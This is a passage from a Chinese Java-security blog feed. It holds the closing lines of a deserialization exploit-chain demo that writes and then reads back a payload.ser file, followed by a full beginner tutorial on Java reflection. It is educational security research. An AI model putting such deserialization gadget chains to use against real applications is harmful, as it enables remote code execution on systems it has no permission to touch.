outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化过程</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a><br><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识java反射</title>
      <link href="/posts/7a787d86.html"/>
      <url>/posts/7a787d86.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习java基础知识记录，方便查阅。</p><h1 id="0x01、反射基础"><a href="#0x01、反射基础" class="headerlink" title="0x01、反射基础"></a>0x01、反射基础</h1><h2 id="一、反射概念"><a href="#一、反射概念" class="headerlink" title="一、反射概念"></a>一、反射概念</h2><blockquote><p>java执行分为<font color="red">编译期</font>和<font color="red">运行期</font><br><font color="red">编译期</font>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><font color="red">运行期</font>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p></blockquote><p>Java 反射机制是在<font color="red">运行状态</font>中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p><strong>Java 反射机制主要提供了以下功能，这些功能都位于<code>java.lang.reflect</code>包。</strong></p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><p><strong>反射与常用引用类对象区别</strong><br>正常方式：引入对应的包类名称——&gt;通过new实例化——&gt;获取实例化对象</p><p><img src="/posts/7a787d86/jc-1.png" title="正常实现"></p><p>反射方式：实例化类对象——&gt;Class获取方法——&gt;得到完整的包类名称</p><p><img src="/posts/7a787d86/jc-4.png" title="反射实现"></p><p><strong>Java反射机制的优缺点</strong><br>优点：</p><ul><li>能够运行时<font color="red">动态获取类的实例</font>，大大提高系统的<font color="red">灵活性</font>和<font color="red">扩展性</font>。</li><li>与Java动态编译相结合，可以实现无比强大的功能。</li><li>降低代码程序之间的依赖性。</li><li>对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li></ul><p>缺点：</p><ul><li>反射会<font color="red">消耗一定的系统资源</font>，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</li><li>冗余了很多代码量。</li><li>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。</li></ul><h2 id="二、反射实现"><a href="#二、反射实现" class="headerlink" title="二、反射实现"></a>二、反射实现</h2><h3 id="1、总结简述"><a href="#1、总结简述" class="headerlink" title="1、总结简述"></a>1、总结简述</h3><font color="red"><p><strong>1、通过Class类获取类。</strong><br><strong>2、通过newInstance()对类进行实例化。</strong><br><strong>3、通过Field访问成员变量|通过Method访问成员方法|通过Constructor访问成员构造方法</strong></p></font><p>注：如果实例类存在构造方法，newInstance()实例化必须保证实例类存在无参构造方法，如只有有参构造方法，newInstance()会报错。Java9以后推荐用clazz.getDeclaredConstructor().newInstance()方式即获取构造方法后再实例化，而非直接newInstance()。</p><p><strong>反射机制重要的类</strong></p><table><thead><tr><th align="center">类</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">java.lang.Class</td><td align="left">代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td align="center">java.lang.reflect.Method</td><td align="left">代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td align="center">java.lang.reflect.Constructor</td><td align="left">代表字节码中的构造方法字节码。代表类中的构造方法（方法名同类名相同且无参的方法）。</td></tr><tr><td align="center">java.lang.reflect.Field</td><td align="left">代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p><font color="red">必须通过Class获取类过后才能获取Method、Constructor、Field</font><br>也就是说Class是反射实现的前提。且Class并不是new出来的，而是java内置的。</p><h3 id="2、Class访问类"><a href="#2、Class访问类" class="headerlink" title="2、Class访问类"></a>2、Class访问类</h3><p><strong>Class获取方式</strong></p><table><thead><tr><th align="center">方式</th><th align="center">示例注解</th></tr></thead><tbody><tr><td align="center">Class.forName(“完整类名带包名”)</td><td align="center">Class A&#x3D;Class.forName(“com.java.reflect.people”);</td></tr><tr><td align="center">对象.getClass()</td><td align="center">people peo&#x3D;new people();Class A&#x3D;peo.getClass();</td></tr><tr><td align="center">任何类型.class</td><td align="center">Class A &#x3D; String.class;</td></tr></tbody></table><p><strong>反射类可访问的常用方法</strong></p><p><img src="/posts/7a787d86/jc-2.png" title="常用方法"></p><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三种获取类的实现截图：</p><p><img src="/posts/7a787d86/jc-4.png" title="Class类获取"></p><h3 id="2、Field访问成员变量"><a href="#2、Field访问成员变量" class="headerlink" title="2、Field访问成员变量"></a>2、Field访问成员变量</h3><p>通过下列任意一个方法访问成员变量时将返回 Field 类型的对象或数组。<br><strong>Field声明使用的方法</strong></p><table><thead><tr><th align="center">Field声明时的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getFields()</td><td align="center">获取所有权限为public的成员变量</td></tr><tr><td align="center">getField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr><tr><td align="center">getDeclaredFields()</td><td align="center">获取当前对象的所有成员变量</td></tr><tr><td align="center">getDeclaredField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr></tbody></table><p>注：针对private私有的变量，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有变量</p><p><strong>Field常用方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获得该成员变量的名称</td></tr><tr><td align="center">getType()</td><td align="left">获取表示该成员变量的 Class 对象</td></tr><tr><td align="center">get(Object obj)</td><td align="left">获得指定对象 obj 中成员变量的值，返回值为 Object 类型</td></tr><tr><td align="center">set(Object obj, Object value)</td><td align="left">将指定对象 obj 中成员变量的值设置为 value</td></tr><tr><td align="center">getlnt(0bject obj)</td><td align="left">获得指定对象 obj 中成员类型为 int 的成员变量的值</td></tr><tr><td align="center">setlnt(0bject obj, int i)</td><td align="left">将指定对象 obj 中成员变量的值设置为 i</td></tr><tr><td align="center">setFloat(Object obj, float f)</td><td align="left">将指定对象 obj 中成员变量的值设置为 f</td></tr><tr><td align="center">getBoolean(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 boolean 的成员变量的值</td></tr><tr><td align="center">setBoolean(Object obj, boolean b)</td><td align="left">将指定对象 obj 中成员变量的值设置为 b</td></tr><tr><td align="center">getFloat(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 float 的成员变量的值</td></tr><tr><td align="center">setAccessible(boolean flag)</td><td align="left">此方法可以设置是否忽略权限直接访问 private 等私有权限的成员变量</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Field实现截图：</p><p><img src="/posts/7a787d86/jc-5.png" title="Field实现"></p><h3 id="3、Method访问成员方法"><a href="#3、Method访问成员方法" class="headerlink" title="3、Method访问成员方法"></a>3、Method访问成员方法</h3><p>要动态获取一个对象方法的信息，首先需要通过下列方法之一创建一个<code>Method</code>类型的对象或者数组。<br><strong>Method声明使用的方法</strong></p><table><thead><tr><th align="center">Method声明使用的方法</th><th align="left">注解</th></tr></thead><tbody><tr><td align="center">getMethods()</td><td align="left">获取所有权限为public的成员方法</td></tr><tr><td align="center">getMethods(String name,Class&lt;?&gt; …parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr><tr><td align="center">getDeclaredMethods()</td><td align="left">获取的成员所有的方法</td></tr><tr><td align="center">getDeclaredMethods(String name,Class&lt;?&gt;…parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr></tbody></table><p>注：针对private私有的方法，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有方法</p><p><strong>Method常用方法</strong></p><table><thead><tr><th align="center">静态方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获取该方法的名称</td></tr><tr><td align="center">getParameterType()</td><td align="left">按照声明顺序以 Class 数组的形式返回该方法各个参数的类型</td></tr><tr><td align="center">getReturnType()</td><td align="left">以 Class 对象的形式获得该方法的返回值类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获得该方法可能抛出的异常类型</td></tr><tr><td align="center">invoke(Object obj,Object…args)</td><td align="left">利用 args 参数执行指定对象 obj 中的该方法，返回值为 Object 类型</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该方法是否允许带有可变数量的参数，如果允许返回 true，否则返回 false</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Method实现截图：</p><p><img src="/posts/7a787d86/jc-6.png" title="Method实现"></p><h3 id="4、Constructor访问成员构造方法"><a href="#4、Constructor访问成员构造方法" class="headerlink" title="4、Constructor访问成员构造方法"></a>4、Constructor访问成员构造方法</h3><p>为了能够动态获取对象构造方法的信息，首先需要通过下列方法之一创建一个 Constructor 类型的对象或者数组。<br><strong>Constructor声明使用的方法</strong></p><table><thead><tr><th align="center">Constructor声明使用的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取所有权限为public的构造方法</td></tr><tr><td align="center">getDeclaredConstructors()</td><td align="center">获取当前对象的所有构造方法</td></tr><tr><td align="center">getDeclaredConstructor(Class&lt;?&gt;…parameterTypes)</td><td align="center">获取当前对象所有带参数类型的构造方法</td></tr></tbody></table><p><strong>Constructor常用的方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">public String getName()</td><td align="left">返回构造方法名</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该构造方法是否允许带可变数量的参数，如果允许，返回 true，否则返回false</td></tr><tr><td align="center">getParameterTypes()</td><td align="left">按照声明顺序以 Class 数组的形式获取该构造方法各个参数的类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获取该构造方法可能抛出的异常类型</td></tr><tr><td align="center">newInstance(Object … initargs)</td><td align="left">通过该构造方法利用指定参数创建一个该类型的对象，如果未设置参数则表示采用默认无参的构造方法</td></tr><tr><td align="center">setAccessiable(boolean flag)</td><td align="left">如果该构造方法的权限为 private，默认为不允许通过反射利用 netlnstance()方法创建对象。如果先执行该方法，并将入口参数设置为 true，则允许创建对象</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该构造方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了无参构造方法：&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">people</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        setinfo(name,phone,age);</span><br><span class="line">        System.out.print(<span class="string">&quot;调用了带参数的构造方法：&quot;</span>+show());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&#123;name:&quot;</span>+name+<span class="string">&quot;;age:&quot;</span>+age+<span class="string">&quot;;phone:&quot;</span>+phone+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Method访问成员setinfo()方法并传参设置变量值</span></span><br><span class="line">        Method mt=people1.getDeclaredMethod(<span class="string">&quot;setinfo&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//Method调用方法传参</span></span><br><span class="line">        Object mtobj=mt.invoke(obj,<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;13011111111&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//Method访问成员show()方法</span></span><br><span class="line">        Method mt2=people1.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        Object mtobj2=mt2.invoke(obj);</span><br><span class="line">        System.out.println(mtobj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------分割线--------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Constructor访问成员构造方法</span></span><br><span class="line">        <span class="comment">//方法一、通过newInstance()调用无参构造方法</span></span><br><span class="line">        Object obj2=people1.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法一：直接通过newInstance()调用无参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法二、通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法</span></span><br><span class="line">        Constructor ct=people1.getDeclaredConstructor(String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        Object obj3=ct.newInstance(<span class="string">&quot;张四&quot;</span>,<span class="string">&quot;13022222222&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法二：通过getDeclaredConstructor()调用带参构造方法,再调用newIntance()传参构造方法&quot;</span>);</span><br><span class="line">        <span class="comment">//方法三、通过getDeclaredConstructor()调用无参构造方法</span></span><br><span class="line">        Constructor ct2=people1.getDeclaredConstructor();</span><br><span class="line">        Object obj4=ct2.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot; 方法三：通过getDeclaredConstructor()调用无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Constructor实现截图：</p><p><img src="/posts/7a787d86/jc-7.png" title="Constructor实现"></p><h1 id="0x02、思考"><a href="#0x02、思考" class="headerlink" title="0x02、思考"></a>0x02、思考</h1><p>Java反射是真的累啊看下来，为了实现动态对类的操作，绕了很大一圈，多出来很多代码去实现这个功能，但确实使用反射很大程度降低了代码之间的依赖性，实现动态加载。<br>java反射核心想法就是：突破常规访问限制，就是为了动态访问类。<br>导致的安全问题也是因为突破常规访问限制，利用反射去访问对象以及篡改变量值包括一些私有属性的变量。</p><h1 id="0x03、参考链接"><a href="#0x03、参考链接" class="headerlink" title="0x03、参考链接"></a>0x03、参考链接</h1><p><a href="http://c.biancheng.net/view/6907.html">http://c.biancheng.net/view/6907.html</a><br><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">https://blog.csdn.net/qq_44715943/article/details/120587716</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次普通的攻击溯源排查</title>
      <link href="/posts/777da932.html"/>
      <url>/posts/777da932.html</url>
      
